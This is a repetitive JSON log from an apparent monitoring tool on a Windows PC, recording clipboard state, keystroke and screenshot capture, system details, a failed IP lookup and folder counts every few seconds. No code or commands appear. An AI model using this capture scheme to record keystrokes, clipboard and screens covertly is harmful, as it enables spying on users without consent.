{"timestamp": "2025-06-14T08:23:06.224522+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7e307a9c757011fc4402de530b4ca8225e37fce4c5256378c4b470198c4e16c5", "_raw_log_hash": "77da9b71fa91a5905ee5210ab89ade949b008f5f4b9237e3f07654086bb03ca2"}
{"timestamp": "2025-06-14T08:23:19.770401+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "72d6144a61351f9ae259a68891ba5a981e3392f1eb6e18de5a4c7566be6c80e9", "_raw_log_hash": "b028063f72e8285006ee4d56f3fddb500d7cc4179c4d0eb2bfc6c5dd43d49153"}
{"timestamp": "2025-06-14T08:23:33.270730+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c2c19155402d68ff231476c3202dd590ec6dccff2774f28c90239d289b1074c4", "_raw_log_hash": "34bed34dd8fb07bd241b33b16cfa2276d96d48439eb98df7fce25a77651af01b"}
{"timestamp": "2025-06-14T08:23:46.770118+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4d3e9fff96028f0ff7da519f26cf1efe316a0d4c99e9ae9089b83514d04f44f3", "_raw_log_hash": "e84d7624a994a7cc7c9804fc89f30bae036cc93bb011b1117cf85b4fa6ef3959"}
{"timestamp": "2025-06-14T08:24:00.374208+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "da283dd36ac84276c99cb2da22ec2378947050bc56e54fe5766dcda401db9af7", "_raw_log_hash": "73c669f972ee446bd4ed00babfc5b737b2b7f91819b71373073156d0b0a3606b"}
{"timestamp": "2025-06-14T08:24:13.918354+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bfbe0c950847b983b02273e2fda5c1dcc5badc8f22ad5bf16100ee0a56e20339", "_raw_log_hash": "d052d761d763742d0101a3903662619e62a75fdb9cda8421f2da079c1ced329f"}
{"timestamp": "2025-06-14T08:24:27.467563+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9be90d2037c0486d01fe3bda8b8a317a2260254bfb7722708439470d22ea50b4", "_raw_log_hash": "14e71ef2aea2e9dd02d317c886917f1aca4335f58a29206e39b2cead9be5259a"}
{"timestamp": "2025-06-14T08:24:40.974534+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "14778bf1b21fb7ff6aca778263d220e190349036b6769bb47c97ab6f13651b61", "_raw_log_hash": "ac985e252020e9f71c63826ecf4ac7ed667cd5669c9288184028ae74f351e545"}
{"timestamp": "2025-06-14T08:24:54.544896+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "84c484b768958ab6ed1e2159238800c3e97020247bb2a8e28b1b86c7adb2f740", "_raw_log_hash": "558052d3360561104a46d4a90ea57a78f2b62882b0f0c89287f2240362555e3d"}
{"timestamp": "2025-06-14T08:25:08.062698+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5badd41e0b51d06f7163de301546901b77b17cf3fd74bccdfa6ed8782355ca61", "_raw_log_hash": "86c2e0a8b4a782318c85ba81ae06ea53c7af25ed795cb67ff020c84ad7855528"}
{"timestamp": "2025-06-14T08:25:21.550533+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "10c907d5c75562507b10fc813e069287433ab2ad8ec5b2122383e46e67bc843b", "_raw_log_hash": "f2ba583c2d9a974616190cc6f63784cfb4c225c8bd2dd57f45200c880c31e535"}
{"timestamp": "2025-06-14T08:25:35.129568+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f9b50a6e0f518b5eb76956eafe07f8f100512b4e97254f539bafd54bebd59a15", "_raw_log_hash": "efcda8cdc1fc098cedff5230d33f1881b0957875461054ebac8fc7d3c50d469c"}
{"timestamp": "2025-06-14T08:25:48.705093+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "54eaba3469211e588d37577376c5547aa13dab89179b4dd95fd975ba7cedf84b", "_raw_log_hash": "9f975029372042d61ba767f84f0afafc9bd53f7fe19d504bb8f8b880b564598a"}
{"timestamp": "2025-06-14T08:26:02.344926+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "16e97181cdc73fa8073e8871e4337917c0f42e1de9db962b1804124dac32fdfa", "_raw_log_hash": "b749bd80adee397a61b130521920f19c713df53d6fb2e0c1e804170cab446dad"}
{"timestamp": "2025-06-14T08:26:16.194412+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2322905d7bf75a9ac64c982cb73244b793e7d67a33a467b01eb0f8c63a44da6f", "_raw_log_hash": "2838996cc755d6b838cc22701bba963d6efd9fd869462db44c86257048873daf"}
{"timestamp": "2025-06-14T08:26:29.863918+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d3ca2ebbf2dbe318e1e20973c6bda16e583ce8cabbbc48762aa6b989ceb186a2", "_raw_log_hash": "d0ff044b2962aa423daf3c78ead60f9e2377bb81f90567bb3902150af19d629f"}
{"timestamp": "2025-06-14T08:26:43.359840+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a832b8c4c9313264a6081344a6b0244ea69d4c6623c015661d52e0ff9d17eb76", "_raw_log_hash": "2d0fabf706b48b2b0906fa5102a071729b64ff0b48a3a1021cf2479711ab1190"}
{"timestamp": "2025-06-14T08:26:56.997687+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6baa1f3c982460fc76293b354fb79b31abf946164e7534ead7e974743bb5ff3c", "_raw_log_hash": "2fa31adffef91d146eae4a4d8c5ceb34fe72e9a4ff9293c3d76276a27ee22dfc"}
{"timestamp": "2025-06-14T08:27:10.492216+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ca4d59b27c21e6113bee22b353f3231e8527239c7992b49de580c65aadc9e196", "_raw_log_hash": "468dd522e64ba7235e34875246b6464356e1cc957db4e2d9a2a14aada4ab4861"}
{"timestamp": "2025-06-14T08:27:24.121594+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c11a254ca5e18577af21dc2374a84f37db088dff6a632e1e7a4da185b7cae486", "_raw_log_hash": "d7f4414600207522e9d71d19e2d3d76c78d1981991644ad25c6ef10b16322d00"}
{"timestamp": "2025-06-14T08:27:37.652912+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8b6475d8fdf24e92946681996e2d621e35b8c31d974ca7f5b6723f1b72f062f5", "_raw_log_hash": "fd3623267af4d55c673cfbee1d87078f0ad959ca3d158763424cc1b7c6582188"}
{"timestamp": "2025-06-14T08:27:51.215291+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5369b9602714aa114f5522d6c52dfef510e336c145c0b3dda99268245ba980f2", "_raw_log_hash": "c0cad57a5ca459bfecc9a59ec07246d5a8c5bb850618516200d032bee2210432"}
{"timestamp": "2025-06-14T08:28:04.800242+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2e9642538632582ce22911d51f3dff8612adbdd84d197536d3eb3b66a9e442a9", "_raw_log_hash": "f61965164a3941caf553654e3db81f2f3e57a9d5fa9487becfb2ea86d0f0bac5"}
{"timestamp": "2025-06-14T08:28:18.342099+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "49dc84703d59057a8357be189f11f3f6143a43bf53c6369dcc193cdb2a5f310f", "_raw_log_hash": "3f2c9c603336b855712ad3a29de60709e8e385d50896379bef810ad895499954"}
{"timestamp": "2025-06-14T08:28:31.944458+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2e4ecc29bcff4178774b49a0d8224f10a698dc1bea9b73cad22e5aed5f86f371", "_raw_log_hash": "6a982c886b983d5144f769a11b76aa92ea44c0d243036cd0a9e576b80eeee444"}
{"timestamp": "2025-06-14T08:28:45.460514+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e9615a48142c9fcb6459a218aaf5c0536f669d67077411da0221ff3c043f8d89", "_raw_log_hash": "95a5b7f18581c24d71c3183ddb03953fa9831142e9f1e94909e5e1e16bfa5bc3"}
